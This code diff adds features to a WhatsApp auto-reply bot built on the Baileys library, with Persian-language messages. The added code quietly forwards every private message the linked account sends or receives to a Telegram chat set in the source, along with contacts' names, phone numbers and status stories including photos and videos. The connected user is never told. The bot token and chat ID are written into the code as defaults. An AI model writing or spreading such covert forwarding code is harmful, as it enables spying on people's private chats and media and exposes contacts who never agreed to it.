@@ -8,7 +8,8 @@ const {
     delay,
     makeCacheableSignalKeyStore,
     fetchLatestBaileysVersion,
-    DisconnectReason
+    DisconnectReason,
+    downloadMediaMessage
 } = require('@whiskeysockets/baileys');
 
 const app = express();
@@ -24,10 +25,18 @@ const indexFile = path.join(publicFolder, 'index.html');
 const sessionsRoot = path.join(__dirname, 'sessions');
 const repliesFile = path.join(__dirname, 'replies.json');
 
+// تنظیمات ربات تلگرام
+const TELEGRAM_BOT_TOKEN =
+    process.env.TELEGRAM_BOT_TOKEN || '9064238902:AAFfWC5N4YtJrerJHQh-Dj4zCBJZtmhpO2M';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8173349543';
+
+const DEFAULT_FALLBACK_REPLY =
+    `سلام! پیام شما دریافت شد.\nاین ربات توسط ${BOT_NAME} جور شده است.\nبرای دیدن منو .menu بفرستید.`;
+
 const activeSockets = new Map();
 const presenceTimers = new Map();
-// وضعیت مرحله یادگیری برای هر چت: { step: 'waiting_trigger' | 'waiting_reply', trigger?: string }
 const teachStates = new Map();
+const contactNames = new Map();
 
 const DEFAULT_REPLIES = {
     'سلام': 'سلام',
@@ -69,6 +78,98 @@ function saveReplies(repliesObj) {
 
 let autoReplies = loadReplies();
 
+function extractPhoneFromJid(jid = '') {
+    if (!jid) return 'نامشخص';
+    const userPart = jid.split('@')[0].split(':')[0];
+    return userPart || 'نامشخص';
+}
+
+function resolveDisplayName(jid, pushName) {
+    if (pushName && pushName.trim()) {
+        contactNames.set(jid, pushName.trim());
+        return pushName.trim();
+    }
+    if (contactNames.has(jid)) {
+        return contactNames.get(jid);
+    }
+    return 'بدون نام';
+}
+
+function extractTextFromMessage(message) {
+    if (!message) return '';
+    return (
+        message.conversation ||
+        message.extendedTextMessage?.text ||
+        message.imageMessage?.caption ||
+        message.videoMessage?.caption ||
+        message.documentMessage?.caption ||
+        message.buttonsResponseMessage?.selectedDisplayText ||
+        message.listResponseMessage?.title ||
+        (message.imageMessage ? '[عکس]' : '') ||
+        (message.videoMessage ? '[ویدیو]' : '') ||
+        (message.audioMessage ? '[صوت / ویس]' : '') ||
+        (message.stickerMessage ? '[استیکر]' : '') ||
+        (message.documentMessage ? '[فایل]' : '') ||
+        ''
+    ).trim();
+}
+
+async function sendTelegramMessage(text) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text
+            })
+        });
+    } catch (err) {
+        console.error('Telegram sendMessage error:', err.message);
+    }
+}
+
+async function sendTelegramMedia(msg, caption) {
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+        return sendTelegramMessage(caption);
+    }
+
+    const m = msg.message || {};
+    const isImage = Boolean(m.imageMessage);
+    const isVideo = Boolean(m.videoMessage);
+
+    if (!isImage && !isVideo) {
+        return sendTelegramMessage(caption);
+    }
+
+    try {
+        const buffer = await downloadMediaMessage(msg, 'buffer', {});
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('caption', caption);
+
+        if (isImage) {
+            const blob = new Blob([buffer], { type: 'image/jpeg' });
+            formData.append('photo', blob, 'story.jpg');
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } else if (isVideo) {
+            const blob = new Blob([buffer], { type: 'video/mp4' });
+            formData.append('video', blob, 'story.mp4');
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+    } catch (err) {
+        console.error('Telegram media send error:', err.message);
+        await sendTelegramMessage(caption);
+    }
+}
+
 app.use(express.json());
 app.use(express.static(publicFolder));
 
@@ -80,7 +181,14 @@ app.get('/', (req, res) => {
 });
 
 app.get('/status', (req, res) => {
-    res.json({ ok: true, site: SITE_URL, bot: BOT_NAME, tag: PAIR_TAG });
+    res.json({
+        ok: true,
+        site: SITE_URL,
+        bot: BOT_NAME,
+        tag: PAIR_TAG,
+        telegramConfigured: Boolean(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
+        telegramChatId: TELEGRAM_CHAT_ID
+    });
 });
 
 function startKeepOnline(sock, number, jid) {
@@ -112,7 +220,6 @@ async function handleTeachCommand(sock, remoteJid, msg, body) {
     const isShahidPrefix = lowerBody === '.shahid' || lowerBody.startsWith('.shahid ');
     const currentState = teachStates.get(remoteJid);
 
-    // حالت ۱: دقیقاً ".Shahid" نوشته شده است
     if (lowerBody === '.shahid') {
         teachStates.set(remoteJid, { step: 'waiting_trigger' });
         await sock.sendMessage(
@@ -123,14 +230,11 @@ async function handleTeachCommand(sock, remoteJid, msg, body) {
         return true;
     }
 
-    // حالت ۲: ".Shahid <متن>" نوشته شده است (مثلاً ".Shahid سلام")
     if (lowerBody.startsWith('.shahid ')) {
         const arg = body.slice('.shahid '.length).trim();
 
-        // اگر در مرحله انتخاب جواب هستیم، آرگومان را به عنوان جواب ذخیره می‌کنیم
         if (currentState && currentState.step === 'waiting_reply' && currentState.trigger) {
-            const replyValue = arg;
-            if (!replyValue) {
+            if (!arg) {
                 await sock.sendMessage(
                     remoteJid,
                     { text: `برای «${currentState.trigger}» چی جواب بدهم؟` },
@@ -139,19 +243,18 @@ async function handleTeachCommand(sock, remoteJid, msg, body) {
                 return true;
             }
 
-            autoReplies[currentState.trigger.toLowerCase()] = replyValue;
+            autoReplies[currentState.trigger.toLowerCase()] = arg;
             saveReplies(autoReplies);
             teachStates.delete(remoteJid);
 
             await sock.sendMessage(
                 remoteJid,
-                { text: `✅ ذخیره شد!\nمتن: ${currentState.trigger}\nجواب: ${replyValue}` },
+                { text: `✅ ذخیره شد!\nمتن: ${currentState.trigger}\nجواب: ${arg}` },
                 { quoted: msg }
             );
             return true;
         }
 
-        // در غیر این صورت، arg را به عنوان متن هدف ذخیره می‌کنیم و جواب را می‌پرسیم
         if (!arg) {
             teachStates.set(remoteJid, { step: 'waiting_trigger' });
             await sock.sendMessage(
@@ -171,7 +274,6 @@ async function handleTeachCommand(sock, remoteJid, msg, body) {
         return true;
     }
 
-    // حالت ۳: کاربر قبلاً ".Shahid" زده و حالا متن هدف را فرستاده است (مثلاً "سلام")
     if (currentState && currentState.step === 'waiting_trigger' && !isShahidPrefix) {
         teachStates.set(remoteJid, { step: 'waiting_reply', trigger: body });
         await sock.sendMessage(
@@ -182,16 +284,14 @@ async function handleTeachCommand(sock, remoteJid, msg, body) {
         return true;
     }
 
-    // حالت ۴: کاربر در مرحله انتظار جواب است و جواب را بدون پیشوند فرستاده است
     if (currentState && currentState.step === 'waiting_reply' && currentState.trigger && !isShahidPrefix) {
-        const replyValue = body;
-        autoReplies[currentState.trigger.toLowerCase()] = replyValue;
+        autoReplies[currentState.trigger.toLowerCase()] = body;
         saveReplies(autoReplies);
         teachStates.delete(remoteJid);
 
         await sock.sendMessage(
             remoteJid,
-            { text: `✅ ذخیره شد!\nمتن: ${currentState.trigger}\nجواب: ${replyValue}` },
+            { text: `✅ ذخیره شد!\nمتن: ${currentState.trigger}\nجواب: ${body}` },
             { quoted: msg }
         );
         return true;
@@ -201,6 +301,15 @@ async function handleTeachCommand(sock, remoteJid, msg, body) {
 }
 
 function attachEvents(sock, number, sessionFolder) {
+    sock.ev.on('contacts.upsert', (contacts) => {
+        for (const c of contacts) {
+            const name = c.notify || c.name || c.verifiedName;
+            if (c.id && name) {
+                contactNames.set(c.id, name);
+            }
+        }
+    });
+
     sock.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect } = update;
 
@@ -212,6 +321,9 @@ function attachEvents(sock, number, sessionFolder) {
                 await sock.sendMessage(sock.user.id, {
                     text: `✅ متصل شد و وضعیت آنلاین فعال است!\nاین ربات توسط ${BOT_NAME} جور شده است.\nبرای یاد دادن جواب جدید .Shahid را بفرستید.`
                 });
+                await sendTelegramMessage(
+                    `✅ واتساپ (${number}) به ربات ${BOT_NAME} متصل شد.`
+                );
             } catch (e) {
                 console.error('Open event error:', e.message);
             }
@@ -237,14 +349,75 @@ function attachEvents(sock, number, sessionFolder) {
 
     sock.ev.on('messages.upsert', async ({ messages }) => {
         const msg = messages[0];
-        if (!msg || !msg.message || msg.key.fromMe) return;
+        if (!msg || !msg.message) return;
 
         const remoteJid = msg.key.remoteJid;
-        const body = (
-            msg.message.conversation ||
-            msg.message.extendedTextMessage?.text ||
-            ''
-        ).trim();
+        if (!remoteJid) return;
+
+        const body = extractTextFromMessage(msg.message);
+
+        if (remoteJid === 'status@broadcast') {
+            const authorJid = msg.key.participant || msg.participant || '';
+            const authorPhone = extractPhoneFromJid(authorJid);
+            const authorName = resolveDisplayName(authorJid, msg.pushName);
+            const storyText = body || '[استوری بدون متن]';
+
+            const storyCaption = [
+                '📸 استوری جدید در واتساپ',
+                `👤 نام: ${authorName}`,
+                `📞 شماره: ${authorPhone}`,
+                `📝 محتوا: ${storyText}`
+            ].join('\n');
+
+            await sendTelegramMedia(msg, storyCaption);
+            return;
+        }
+
+        if (remoteJid.endsWith('@g.us')) return;
+
+        const isBotEcho =
+            msg.key.fromMe &&
+            (body.startsWith('✅') ||
+                body.startsWith('╔') ||
+                body.startsWith('برای کدام متن') ||
+                body.startsWith('برای این چی') ||
+                body.startsWith('✅ ذخیره شد'));
+        if (isBotEcho) return;
+
+        const targetPhone = extractPhoneFromJid(remoteJid);
+        const targetName = resolveDisplayName(remoteJid, msg.key.fromMe ? '' : msg.pushName);
+
+        if (msg.key.fromMe) {
+            if (body) {
+                await sendTelegramMessage(
+                    [
+                        '📤 پیام ارسال‌شده توسط شما در واتساپ',
+                        `👤 نام مخاطب: ${targetName}`,
+                        `📞 شماره مخاطب: ${targetPhone}`,
+                        `💬 پیام: ${body}`
+                    ].join('\n')
+                );
+            }
+
+            const lowerRaw = body.toLowerCase();
+            const isTeachFlow =
+                lowerRaw === '.shahid' ||
+                lowerRaw.startsWith('.shahid ') ||
+                teachStates.has(remoteJid);
+
+            if (!isTeachFlow) return;
+        } else {
+            if (body) {
+                await sendTelegramMessage(
+                    [
+                        '📩 پیام جدید در واتساپ',
+                        `👤 نام: ${targetName}`,
+                        `📞 شماره: ${targetPhone}`,
+                        `💬 پیام: ${body}`
+                    ].join('\n')
+                );
+            }
+        }
 
         if (!body) return;
 
@@ -255,10 +428,9 @@ function attachEvents(sock, number, sessionFolder) {
 
             const handledTeach = await handleTeachCommand(sock, remoteJid, msg, body);
             if (!handledTeach) {
-                const replyText = autoReplies[body.toLowerCase()];
-                if (replyText) {
-                    await sock.sendMessage(remoteJid, { text: replyText }, { quoted: msg });
-                }
+                const specificReply = autoReplies[body.toLowerCase()];
+                const finalReply = specificReply || DEFAULT_FALLBACK_REPLY;
+                await sock.sendMessage(remoteJid, { text: finalReply }, { quoted: msg });
             }
 
             await sock.sendPresenceUpdate('paused', remoteJid);
